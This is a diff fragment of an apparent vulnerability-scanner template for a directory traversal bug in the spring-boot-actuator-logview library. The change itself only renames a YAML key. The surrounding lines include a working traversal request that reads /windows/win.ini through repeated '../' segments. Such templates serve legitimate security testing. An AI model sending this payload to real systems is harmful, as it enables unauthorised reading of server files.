@@ -7,7 +7,7 @@ info:
   description: spring-boot-actuator-logview in a library that adds a simple logfile viewer as spring boot actuator endpoint. It is maven package "eu.hinsch:spring-boot-actuator-logview". In spring-boot-actuator-logview before version 0.2.13 there is a directory traversal vulnerability.
   tags: springboot
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../"  # Windows
